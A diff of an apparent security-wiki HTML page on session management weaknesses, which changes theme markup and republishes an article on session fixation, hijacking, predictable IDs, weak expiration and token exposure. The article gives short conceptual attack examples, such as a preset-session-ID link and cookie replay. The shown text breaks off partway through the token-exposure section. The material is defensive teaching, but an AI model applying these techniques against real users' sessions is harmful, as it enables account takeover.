@@ -1,37 +1,54 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Session Management Weaknesses # Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Session Management Weaknesses" />
-<meta property="og:description" content="Session Management Weaknesses # Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Session Management Weaknesses | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Session Management Weaknesses# Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Session Management Weaknesses">
+	<meta property="og:description" content="Session Management Weaknesses# Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Session Management Weaknesses">
+	<meta itemprop="description" content="Session Management Weaknesses# Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="3357">
+
+<title>Session Management Weaknesses • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Session-Management-Weaknesses/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -39,11 +56,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -54,9 +75,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -71,8 +89,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -88,8 +106,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -175,8 +193,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -223,8 +241,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -978,8 +996,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1000,8 +1018,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1022,8 +1040,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1044,8 +1062,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1066,8 +1084,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1101,8 +1119,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1123,8 +1141,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1145,8 +1163,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1167,35 +1185,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1203,30 +1199,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Session Management Weaknesses</strong>
+  <h3>Session Management Weaknesses</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1322,24 +1319,12 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="session-management-weaknesses">
-  Session Management Weaknesses
-  <a class="anchor" href="#session-management-weaknesses">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="session-management-weaknesses">Session Management Weaknesses<a class="anchor" href="#session-management-weaknesses">#</a></h1>
 <p>Session Management is a critical security mechanism that maintains user state across multiple HTTP requests in stateless web applications. Vulnerabilities in session management occur when applications fail to properly generate, protect, transmit, validate, or invalidate session identifiers, allowing attackers to hijack legitimate user sessions, impersonate users, or bypass authentication entirely. These weaknesses enable unauthorized access to user accounts, sensitive data theft, privilege escalation, and complete account takeover without needing valid credentials.</p>
-<h3 id="why-sessions-are-required">
-  Why Sessions Are Required
-  <a class="anchor" href="#why-sessions-are-required">#</a>
-</h3>
+<h3 id="why-sessions-are-required">Why Sessions Are Required<a class="anchor" href="#why-sessions-are-required">#</a></h3>
 <p>HTTP is a <strong>stateless protocol</strong>, meaning each request is independent and the server does not remember previous requests from the same client. Session management allows applications to associate multiple requests with the same authenticated user.</p>
-<h2 id="types-of-session-management-vulnerabilities">
-  Types of Session Management Vulnerabilities
-  <a class="anchor" href="#types-of-session-management-vulnerabilities">#</a>
-</h2>
-<h3 id="1-session-fixation">
-  1. Session Fixation
-  <a class="anchor" href="#1-session-fixation">#</a>
-</h3>
+<h2 id="types-of-session-management-vulnerabilities">Types of Session Management Vulnerabilities<a class="anchor" href="#types-of-session-management-vulnerabilities">#</a></h2>
+<h3 id="1-session-fixation">1. Session Fixation<a class="anchor" href="#1-session-fixation">#</a></h3>
 <ul>
 <li>Attacker forces a known session ID onto a victim&rsquo;s browser before authentication</li>
 <li>Victim authenticates using the attacker-controlled session ID</li>
@@ -1347,16 +1332,12 @@ https://github.com/alex-shpak/hugo-book
 <li>Attacker uses the pre-set session ID to hijack the authenticated session</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">sends</span> <span style="color:#a6e22e">victim</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">link</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">predetermined</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">sends</span> <span style="color:#a6e22e">victim</span> <span style="color:#a6e22e">a</span> <span style="color:#a6e22e">link</span> <span style="color:#66d9ef">with</span> <span style="color:#a6e22e">predetermined</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">ID</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//target.com/login?PHPSESSID=attacker_controlled_session_123
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Victim</span> <span style="color:#a6e22e">logs</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">using</span> <span style="color:#66d9ef">this</span> <span style="color:#a6e22e">session</span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Application</span> <span style="color:#a6e22e">doesn</span><span style="color:#e6db74">&#39;t regenerate session ID
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Attacker uses same session ID to access victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><h3 id="2-session-hijacking-sidejacking">
-  2. Session Hijacking (Sidejacking)
-  <a class="anchor" href="#2-session-hijacking-sidejacking">#</a>
-</h3>
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"># Attacker uses same session ID to access victim&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><h3 id="2-session-hijacking-sidejacking">2. Session Hijacking (Sidejacking)<a class="anchor" href="#2-session-hijacking-sidejacking">#</a></h3>
 <ul>
 <li>Attacker intercepts or steals a valid session token</li>
 <li>Common methods: network sniffing, XSS, malware, physical access</li>
@@ -1364,16 +1345,12 @@ https://github.com/alex-shpak/hugo-book
 <li>Works when sessions transmitted over unencrypted connections or tokens stored insecurely</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">transmitted</span> <span style="color:#a6e22e">over</span> <span style="color:#a6e22e">HTTP</span> (<span style="color:#a6e22e">unencrypted</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">transmitted</span> <span style="color:#a6e22e">over</span> <span style="color:#a6e22e">HTTP</span> (<span style="color:#a6e22e">unencrypted</span>)
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> <span style="color:#f92672">/</span><span style="color:#a6e22e">dashboard</span> <span style="color:#a6e22e">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Cookie</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">session_id</span><span style="color:#f92672">=</span><span style="color:#a6e22e">valid_user_session_abc123</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">intercepts</span> <span style="color:#a6e22e">on</span> <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">WiFi</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Replays</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span>
-</span></span></code></pre></div><h3 id="3-predictable-session-ids">
-  3. Predictable Session IDs
-  <a class="anchor" href="#3-predictable-session-ids">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Replays</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">cookie</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">access</span> <span style="color:#a6e22e">victim</span><span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">s</span> <span style="color:#a6e22e">account</span></span></span></code></pre></div><h3 id="3-predictable-session-ids">3. Predictable Session IDs<a class="anchor" href="#3-predictable-session-ids">#</a></h3>
 <ul>
 <li>Application generates session tokens using weak or predictable algorithms</li>
 <li>Attacker analyzes pattern in session ID generation</li>
@@ -1381,7 +1358,7 @@ https://github.com/alex-shpak/hugo-book
 <li>Gains unauthorized access without credentials</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Sequential</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">IDs</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Sequential</span> <span style="color:#a6e22e">session</span> <span style="color:#a6e22e">IDs</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User1</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000001</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User2</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000002</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User3</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">SESSION</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1000003</span>
@@ -1389,11 +1366,7 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Timestamp</span><span style="color:#f92672">-</span><span style="color:#a6e22e">based</span> <span style="color:#a6e22e">sessions</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">SESSION</span><span style="color:#f92672">=</span><span style="color:#ae81ff">20260407143000</span><span style="color:#a6e22e">_user123</span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">predicts</span> <span style="color:#a6e22e">next</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span>
-</span></span></code></pre></div><h3 id="4-insufficient-session-expiration">
-  4. Insufficient Session Expiration
-  <a class="anchor" href="#4-insufficient-session-expiration">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">predicts</span> <span style="color:#a6e22e">next</span> <span style="color:#a6e22e">valid</span> <span style="color:#a6e22e">session</span></span></span></code></pre></div><h3 id="4-insufficient-session-expiration">4. Insufficient Session Expiration<a class="anchor" href="#4-insufficient-session-expiration">#</a></h3>
 <ul>
 <li>Sessions remain valid indefinitely or for excessive periods</li>
 <li>No automatic logout after inactivity</li>
@@ -1401,15 +1374,11 @@ https://github.com/alex-shpak/hugo-book
 <li>Enables attacks on abandoned sessions, shared computers, or stolen credentials</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">never</span> <span style="color:#a6e22e">expires</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">never</span> <span style="color:#a6e22e">expires</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span> <span style="color:#a6e22e">logs</span> <span style="color:#66d9ef">in</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">created</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">User</span> <span style="color:#a6e22e">closes</span> <span style="color:#a6e22e">browser</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">still</span> <span style="color:#a6e22e">valid</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">Days</span> <span style="color:#a6e22e">later</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">still</span> <span style="color:#a6e22e">active</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">old</span> <span style="color:#a6e22e">session</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">Full</span> <span style="color:#a6e22e">access</span>
-</span></span></code></pre></div><h3 id="5-session-token-exposure">
-  5. Session Token Exposure
-  <a class="anchor" href="#5-session-token-exposure">#</a>
-</h3>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">Attacker</span> <span style="color:#a6e22e">finds</span> <span style="color:#a6e22e">old</span> <span style="color:#a6e22e">session</span> <span style="color:#960050;background-color:#1e0010">→</span> <span style="color:#a6e22e">Full</span> <span style="color:#a6e22e">access</span></span></span></code></pre></div><h3 id="5-session-token-exposure">5. Session Token Exposure<a class="anchor" href="#5-session-token-exposure">#</a></h3>
 <ul>
 <li>Session IDs leaked through URLs, logs, referrer headers, or error messages</li>
 <li>Tokens stored in browser history, server logs, or third-party analytics</li>
@@ -1417,17 +1386,13 @@ https://github.com/alex-shpak/hugo-book
 <li>Enables token theft through various information disclosure vectors</li>
 </ul>
 <p><strong>Example:</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">ID</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">URL</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Session</span> <span style="color:#a6e22e">ID</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">URL</span>
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">https</span><span style="color:#f92672">:</span><span style="color:#75715e">//bank.com/account?session=abc123xyz
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">Leaked</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">Referer</span> <span style="color:#a6e22e">header</span> <span style="color:#a6e22e">when</span> <span style="color:#a6e22e">clicking</span> <span style="color:#a6e22e">external</span> <span style="color:#a6e22e">links</span>
